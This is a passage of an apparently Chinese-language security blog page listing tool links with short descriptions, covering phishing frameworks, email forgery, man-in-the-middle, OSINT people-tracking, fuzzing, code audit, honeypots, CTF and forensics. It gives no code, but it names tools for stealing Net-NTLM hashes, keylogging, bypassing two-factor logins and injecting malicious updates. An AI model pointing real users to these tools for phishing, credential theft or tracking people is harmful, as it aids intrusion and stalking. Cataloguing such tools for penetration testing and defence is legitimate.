class="line">https:&#x2F;&#x2F;github.com&#x2F;deepzec&#x2F;Bad-Pdf 生成一个 pdf 文件，内含 payload 来窃取 win 上的 Net-NTLM 哈希</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;3gstudent&#x2F;Worse-PDF 向 PDF 文件中插入恶意代码，来窃取 win 上的 Net-NTLM 哈希</span><br></pre></td></tr></table></figure><h3 id="社工相关"><a href="#社工相关" class="headerlink" title="社工相关"></a>社工相关</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;github.com&#x2F;brannondorsey&#x2F;PassGAN py,深度学习,密码字典样本生成</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;Mebus&#x2F;cupp 根据用户习惯密码生成弱口令探测</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;Saferman&#x2F;cupper 根据用户习惯密码生成弱口令探测，楼上升级</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;LandGrey&#x2F;pydictor py3，特定密码字典生成</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;mehulj94&#x2F;Radium-Keylogger python 下的键盘记录工具</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;threatexpress&#x2F;domainhunter 检查过期域名，bluecoat 分类和 Archive.org 历史记录，以确定最为适合于钓鱼和 C2 的域名</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;Mr-Un1k0d3r&#x2F;CatMyPhish 收集目标类似的尚未注册的域名</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;x0day&#x2F;Multisearch-v2 Bing、google、360、zoomeye 等搜索引擎聚合搜索，可用于发现企业被搜索引擎收录的敏感资产信息</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;n0tr00t&#x2F;Sreg Sreg 可对使用者通过输入 email、phone、username 的返回用户注册的所有互联网护照信息。</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;SpiderLabs&#x2F;social_mapper 社交媒体枚举和关联工具, 通过人脸识别关联人物侧写</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;vysec&#x2F;MaiInt 公司雇员信息收集测试工具</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;jofpin&#x2F;trape py，利用 OSINT 对人员进行追踪定位</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;famavott&#x2F;osint-scraper 输入人名或邮箱地址, 自动从互联网爬取关于此人的信息</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;xHak9x&#x2F;fbi py2,facebook 脸书信息搜集工具</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;initstring&#x2F;linkedin2username 通过 Linkedin 领英获取相关公司员工列表</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;0x09AL&#x2F;raven linux 下领英 Linkedin information gathering tool</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;Ridter&#x2F;Mailget 通过脉脉用户猜测企业邮箱</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;haccer&#x2F;tweep 使用 twitter API 进行信息爬取查询</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;MazenElzanaty&#x2F;TwLocation py，获取 Twitter 用户发推的地址</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;vaguileradiaz&#x2F;tinfoleak web 界面，对某人的 twitter 进行全面的情报分析</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;deepfakes 虚假音视频制作</span><br><span class="line">https:&#x2F;&#x2F;www.jianshu.com&#x2F;p&#x2F;147cf5414851 聊聊那些常见的探侦类 APP</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;thinkst&#x2F;canarytokens 重要文件的追踪溯源，信标定位（https:&#x2F;&#x2F;canarytokens.org&#x2F;generate#）</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;ggerganov&#x2F;kbd-audio c++,linux,利用麦克风监控键盘输入测试输入值</span><br></pre></td></tr></table></figure><h3 id="网站克隆镜像伪造"><a href="#网站克隆镜像伪造" class="headerlink" title="网站克隆镜像伪造"></a>网站克隆镜像伪造</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;www.httrack.com 网站克隆镜像</span><br></pre></td></tr></table></figure><h3 id="钓鱼框架邮件伪造"><a href="#钓鱼框架邮件伪造" class="headerlink" title="钓鱼框架邮件伪造"></a>钓鱼框架邮件伪造</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;github.com&#x2F;bhdresh&#x2F;SocialEngineeringPayloads 负责收集用于证书盗窃和鱼叉式网络钓鱼攻击的社交工程技巧和 payloads</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;trustedsec&#x2F;social-engineer-toolkit 专为社交工程设计的开源渗透测试框架</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;thelinuxchoice&#x2F;blackeye 拥有 facebook、instagram 等三十余个钓鱼模板的一键启用工具</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;M4cs&#x2F;BlackEye-Python 以 blackeye 为基础加强子域的管理</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;azizaltuntas&#x2F;Camelishing py3，界面化社会工程学攻击辅助工具</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;JonCooperWorks&#x2F;judas go，克隆网站钓鱼</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;gophish&#x2F;gophish go，拥有在线模板设计、发送诱骗广告等功能的钓鱼系统</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;tatanus&#x2F;SPF py2，deefcon 上的钓鱼系统</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;MSG-maniac&#x2F;mail_fishing 甲方内部钓鱼系统</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;samyoyo&#x2F;weeman 钓鱼的 http 服务器</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;Raikia&#x2F;FiercePhish 可以管理所有钓鱼攻击的完整钓鱼框架，允许你跟踪单独的网络钓鱼活动，定时发送电子邮件等</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;securestate&#x2F;king-phisher 可视化钓鱼活动工具包</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;fireeye&#x2F;ReelPhish 实时双因素网络钓鱼工具</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;kgretzky&#x2F;evilginx 绕过双因素验证的钓鱼框架</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;kgretzky&#x2F;evilginx2 MiTM 框架, 登录页面钓鱼, 绕过双因素认证等</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;ustayready&#x2F;CredSniper 使用 Flask 和 Jinja2 模板编写的网络钓鱼框架，支持捕获 2FA 令牌</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;fireeye&#x2F;PwnAuth OAuth 滥用测试检测平台</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;n0pe-sled&#x2F;Postfix-Server-Setup 自动化建立一个网络钓鱼服务器</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;Dionach&#x2F;PhEmail py2，钓鱼与邮件伪造</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;PHPMailer&#x2F;PHPMailer 世界上最流行的 PHP 发送邮件的代码</span><br><span class="line">http:&#x2F;&#x2F;tool.chacuo.net&#x2F;mailanonymous 在线邮件伪造</span><br><span class="line">http:&#x2F;&#x2F;ns4gov.000webhostapp.com 在线邮件伪造</span><br></pre></td></tr></table></figure><h3 id="中间人攻击流量劫持"><a href="#中间人攻击流量劫持" class="headerlink" title="中间人攻击流量劫持"></a>中间人攻击流量劫持</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;github.com&#x2F;bettercap&#x2F;bettercap 网络攻击以及监控的瑞士军刀。该工具支持多种模块，比如 ARP&#x2F;DNS 欺骗、TCP 以及数据包代理等</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;mitmproxy&#x2F;mitmproxy PY,支持 SSL 拦截，进行 https 流量代理</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;qiyeboy&#x2F;BaseProxy py3,异步 http&#x2F;https 代理,楼上简化版。可以作为中间人工具，比如说替换网址图片等</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;lgandx&#x2F;Responder 用于嗅探网络内所有的 NTLM、NTLMv1&#x2F;v2、Net-NTLMv1&#x2F;v2 包，对网络内主机进行欺骗获取用户 hash。a 拿着 b 密码请求 b，c 对 a 说我是 b，然后 c 获得了 b 的密码，https:&#x2F;&#x2F;www.secpulse.com&#x2F;archives&#x2F;65503.html 【脉搏译文系列】渗透师指南之 Responder。</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;Kevin-Robertson&#x2F;Inveigh 一款 PowerShell LLMNR &#x2F; mDNS &#x2F; NBNS 欺骗器和中间人工具</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;LionSec&#x2F;xerosploit 中间人攻击测试工具包</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;AlsidOfficial&#x2F;WSUSpendu 可以自主创建恶意更新，并将其注入到 WSUS 服务器数据库中，然后随意的分发这些恶意更新</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;infobyte&#x2F;evilgrade 一个模块化的脚本框架，使攻击者在不知情的情况下将恶意更新注入到用户更新中</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;quickbreach&#x2F;smbetray 专注于通过文件内容交换、lnk 交换来攻击客户端，以及窃取任何以明文形式传输的数据</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;mrexodia&#x2F;haxxmap 对 IMAP 服务器进行中间人攻击</span><br></pre></td></tr></table></figure><h3 id="协议解析流量还原分析"><a href="#协议解析流量还原分析" class="headerlink" title="协议解析流量还原分析"></a>协议解析流量还原分析</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;github.com&#x2F;wireshark&#x2F;wireshark 协议解析流量分析还原</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;CoreSecurity&#x2F;impacket Impacket 是用于处理网络协议的 Python 工具包集合，内网中可用以提权例如 wmiexec.py、NMB，SMB1-3 和 MS-DCERPC 提供对协议实现本身的低级别编程访问。</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;secdev&#x2F;scapy 内置了交互式网络数据包处理、数据包生成器、网络扫描器网络发现和包嗅探工具，提供多种协议包生成及解析插件，能够灵活的的生成协议数据包，并进行修改、解析。</span><br><span class="line">https:&#x2F;&#x2F;gitee.com&#x2F;qielige&#x2F;openQPA 协议分析软件 QPA 的开源代码，特点是进程抓包、特征自动分析</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;jtpereyda&#x2F;boofuzz 网络协议 fuzz 测试</span><br><span class="line">https:&#x2F;&#x2F;www.jianshu.com&#x2F;p&#x2F;4dca12a35158 5 个常用的免费报文库</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;zerbea&#x2F;hcxdumptool 从 Wlan 设备上捕获数据包</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;NytroRST&#x2F;NetRipper 支持截获像 putty,winscp,mssql,chrome,firefox,outlook，https 中的明文密码</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;shramos&#x2F;polymorph 支持几乎所有现有协议的实时网络数据包操作框架</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;nospaceships&#x2F;raw-socket-sniffer C,PS，无需驱动抓取 Windows 流量</span><br></pre></td></tr></table></figure><h3 id="Fuzz-模糊测试漏洞挖掘"><a href="#Fuzz-模糊测试漏洞挖掘" class="headerlink" title="Fuzz 模糊测试漏洞挖掘"></a>Fuzz 模糊测试漏洞挖掘</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;www.freebuf.com&#x2F;articles&#x2F;rookie&#x2F;169413.html 一系列用于 Fuzzing 学习的资源汇总</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;secfigo&#x2F;Awesome-Fuzzing Fuzz 相关学习资料</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;fuzzdb-project&#x2F;fuzzdb fuzz 资料数据库</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;ivanfratric&#x2F;winafl AFL for fuzzing Windows binaries,原创技术分析 | AFL 漏洞挖掘技术漫谈</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;attekett&#x2F;NodeFuzz a fuzzer harness for web browsers and browser like applications.</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;google&#x2F;oss-fuzz Continuous Fuzzing for Open Source Software</span><br><span class="line">http:&#x2F;&#x2F;blog.topsec.com.cn&#x2F;ad_lab&#x2F;alphafuzzer&#x2F; 以文件格式为主的漏洞挖掘工具</span><br><span class="line">https:&#x2F;&#x2F;bbs.ichunqiu.com&#x2F;thread-24898-1-1.html Test404 -HTTP Fuzzer V3.0</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;xmendez&#x2F;wfuzz py，Web 安全模糊测试工具，模块化可处理 burp 所抓请求和响应报文</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;1N3&#x2F;BlackWidow 基于 Python 实现的 Web 爬虫，用于收集目标网站的情报信息并对 OWASP 漏洞进行模糊测试</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;bunzen&#x2F;pySSDeep py，一个基于模糊哈希（Fuzzy Hashing）算法的工具。go，glaslos&#x2F;ssdeep；C，ssdeep-project&#x2F;ssdeep</span><br></pre></td></tr></table></figure><h3 id="安全防护"><a href="#安全防护" class="headerlink" title="安全防护"></a>安全防护</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;github.com&#x2F;baidu&#x2F;AdvBox Advbox 是支持多种深度学习平台的 AI 模型安全工具箱，既支持白盒和黑盒算法生成对抗样本，衡量 AI 模型鲁棒性，也支持常见的防御算法</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;quoscient&#x2F;octopus 区块链智能合约安全分析工具</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;Cyb3rWard0g&#x2F;HELK 具有高级分析功能的威胁狩猎 ELK</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;trimstray&#x2F;otseca linux 系统审计工具，可以导出系统配置，生成报表</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;BugScanTeam&#x2F;DNSLog 一款基于 django 监控 DNS 解析记录和 HTTP 访问记录的工具，可以配合盲注、xss、解析对方真实 ip 使用</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;mwrlabs&#x2F;dref DNS 重绑定利用框架</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;chengr28&#x2F;Pcap_DNSProxy&#x2F;blob&#x2F;master&#x2F;README.zh-Hans.md Pcap_DNSProxy 是一个基于 WinPcap&#x2F;LibPcap 用于过滤 DNS 投毒污染的工具</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;PlagueScanner&#x2F;PlagueScanner 使用 python 实现的集成 ClamAV、ESET、Bitdefender 的反病毒引擎</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;m4rco-&#x2F;dorothy2 一款木马、僵尸网络分析框架</span><br><span class="line">http:&#x2F;&#x2F;github.com&#x2F;jumpserver&#x2F;jumpserver 基于 Python3 的开源堡垒机</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;github&#x2F;glb-director 负载均衡组件 GLB，数据解析使用了 dpdk</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;processhacker&#x2F;processhacker 监控系统资源、软件调试、检测恶意软件，管理进程</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;TKCERT&#x2F;mail-security-tester 检测邮件防护与过滤系统的测试框架</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;chaitin&#x2F;sqlchop-http-proxy 利用 HTTP 反向代理，内置 SQLChop 作为 SQL 注入攻击检测模块，可以拦截 SQL 注入流量而放行正常流量</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;OWASP&#x2F;SecureTea-Project 当有人私自触碰电脑鼠标或触摸板，进行报警</span><br></pre></td></tr></table></figure><h3 id="代码审计应用测试"><a href="#代码审计应用测试" class="headerlink" title="代码审计应用测试"></a>代码审计应用测试</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;www.waitalone.cn&#x2F;seay-source-code-auditv2.html Seay 源代码审计系统 2.1 版本</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;pyupio&#x2F;safety 检查所有已安装 Python 包, 查找已知的安全漏洞</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;pumasecurity&#x2F;puma-scan 实时代码审计，vs 插件</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;wufeifei&#x2F;cobra 白盒代码安全审计系统</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;OneSourceCat&#x2F;phpvulhunter 静态 php 代码审计</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;ripsscanner&#x2F;rips 基于 php 的 php 代码审计工具</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;Qihoo360&#x2F;phptrace 跟踪、分析 PHP 运行情况的工具</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;ajinabraham&#x2F;NodeJsScan Node.JS 应用代码审计</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;ctxis&#x2F;beemka 针对 Electron App 的漏洞利用工具包</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;doyensec&#x2F;electronegativity Electron 应用代码审计，App 的错误配置和安全问题</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;shengqi158&#x2F;pyvulhunter Python 应用审计</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;securego&#x2F;gosec Go 语言源码安全分析工具</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;GoSSIP-SJTU&#x2F;TripleDoggy 基于 clang 的 c&#x2F;c++&#x2F;object-c 源代码检测框架，有大量接口可以被调用</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;ga0&#x2F;pyprotect 给 python 代码加密，防止逆向</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;presidentbeef&#x2F;brakeman Ruby on Rails 应用静态代码分析</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;python-security&#x2F;pyt 用于检测 Python Web 应用程序中的安全漏洞的静态分析工具</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;m4ll0k&#x2F;WPSploit WordPress 插件代码安全审计</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;elcodigok&#x2F;wphardening 加强任何 WordPress 安装的安全</span><br></pre></td></tr></table></figure><h3 id="蜜罐安全"><a href="#蜜罐安全" class="headerlink" title="蜜罐安全"></a>蜜罐安全</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;github.com&#x2F;paralax&#x2F;awesome-honeypots 蜜罐开源技术收集</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;threatstream&#x2F;mhn 现代蜜网，集成了多种蜜罐的安装脚本，可以快速部署、使用，也能够快速的从节点收集数据</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;dtag-dev-sec&#x2F;tpotce T-POT，里面使用 docker 技术实现多个蜜罐组合，配合 ELK 进行研究与数据捕获</span><br><span class="line">https:&#x2F;&#x2F;www.freebuf.com&#x2F;sectool&#x2F;190840.html T-Pot 多蜜罐平台使用心法</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;n3uz&#x2F;t-pot-autoinstall 将 fork 的 T-POT 蜜罐的一键安装脚本替换为国内加速镜像</span><br></pre></td></tr></table></figure><h3 id="Web-蜜罐内网监测"><a href="#Web-蜜罐内网监测" class="headerlink" title="Web 蜜罐内网监测"></a>Web 蜜罐内网监测</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;github.com&#x2F;micheloosterhof&#x2F;cowrie py2，使用 ELK（ElasticSearch，LogStash，Kibana）进行数据分析，目前支持 ssh，telnet，sftp 等协议</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;mushorg&#x2F;snare py3，web 安全蜜罐，可克隆指定 Web 页面</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;honeynet&#x2F;beeswarm py，使用 agent 探针与蜜罐进行实时交互来引诱攻击者</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;thinkst&#x2F;opencanary PY2,SNMP\RDP\SAMBA 蜜罐</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;p1r06u3&#x2F;opencanary_web PY,TORNADO,内网低交互蜜罐。支持自动化安装，目前支持常见的 16 中协议，现为探针&#x2F;蜜罐-管理的架构，可以考虑二次开发为探针-沙盒-管理的架构</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;p1r06u3&#x2F;opencanary_web</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;Cymmetria 知名欺骗防御蜜罐组织。Struct、weblogic、telnet、Cisco ASA、Micros 等仿真蜜罐</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;Cymmetria&#x2F;honeycomb Cymmetria 公司开源蜜罐框架，低交互</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;honeytrap&#x2F;honeytrap 可扩展蜜罐框架，支持探针部署与高交互蜜罐</span><br><span class="line">https:&#x2F;&#x2F;gosecure.net&#x2F;2018&#x2F;12&#x2F;19&#x2F;rdp-man-in-the-middle-smile-youre-on-camera&#x2F; RDP MITM，打造可记录图像和按键的 RDP 蜜罐（https:&#x2F;&#x2F;github.com&#x2F;gosecure&#x2F;pyrdp）</span><br></pre></td></tr></table></figure><h3 id="工控蜜罐"><a href="#工控蜜罐" class="headerlink" title="工控蜜罐"></a>工控蜜罐</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;github.com&#x2F;sjhilt&#x2F;GasPot 模拟油电燃气工控系统</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;djformby&#x2F;GRFICS IoT 工业仿真系统模拟框架，采用 MODBUS 协议对 PLC 虚拟机监视和控制</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;RabitW&#x2F;IoTSecurityNAT IoT 测试系统，方便快速接入各种设备，进行安全测试</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;mushorg&#x2F;conpot 针对 ICS&#x2F;SCADA 的低交互工控蜜罐，模拟 Modbus 和 S7comm</span><br></pre></td></tr></table></figure><h3 id="CTF-相关"><a href="#CTF-相关" class="headerlink" title="CTF 相关"></a>CTF 相关</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;ctf-wiki.github.io&#x2F;ctf-wiki&#x2F; CTFwiki，Misc&#x2F;Crypto&#x2F;Web&#x2F;Assembly&#x2F;Executable&#x2F;Reverse&#x2F;Pwn&#x2F;Android&#x2F;ICS</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;adon90&#x2F;pentest_compilation ctf 比赛与 OSCP 考试中常见的知识点和命令</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;gabemarshall&#x2F;microctfs 小型 ctf 镜像 docker</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;giantbranch&#x2F;pwn_deploy_chroot 部署多个 pwn 题到一个 docker 容器中</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;facebook&#x2F;fbctf CTF 比赛框架</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;0Chencc&#x2F;CTFCrackTools CTF 工具集成包</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;guyoung&#x2F;CaptfEncoder CTF 密码编码全家桶，还有小程序版本</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;Gallopsled&#x2F;pwntools pwn 类型，二进制利用框架</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;ChrisTheCoolHut&#x2F;Zeratool pwn 类型，二进制利用框架</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;ChrisTheCoolHut&#x2F;Rocket-Shot pwn，自动攻击脚本</span><br><span class="line">https:&#x2F;&#x2F;0xrick.github.io&#x2F;lists&#x2F;stego&#x2F; 隐写术工具集，Steganography - A list of useful tools and resources</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;DominicBreuker&#x2F;stego-toolkit 隐写工具包</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;bugsafe&#x2F;WeReport WeReport 报告助手</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;PELock&#x2F;CrackMeZ3S-CTF-CrackMe-Tutorial 为 CTF 比赛编写 CrackMe 软件</span><br></pre></td></tr></table></figure><h3 id="计算机与移动设备取证调查"><a href="#计算机与移动设备取证调查" class="headerlink" title="计算机与移动设备取证调查"></a>计算机与移动设备取证调查</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;www.freebuf.com&#x2F;articles&#x2F;rookie&#x2F;195107.html 记一次微信数据库解密过程。微信的加密数据库的解密密码是由“设备的 IMEI(MEID)+用户的 uin，进行 MD5，然后取其前 7 位小写字母”构成的</span><br><span class="line">https:&#x2F;&#x2F;www.audacityteam.org&#x2F; 音频文件和波形图处理工具</span><br><span 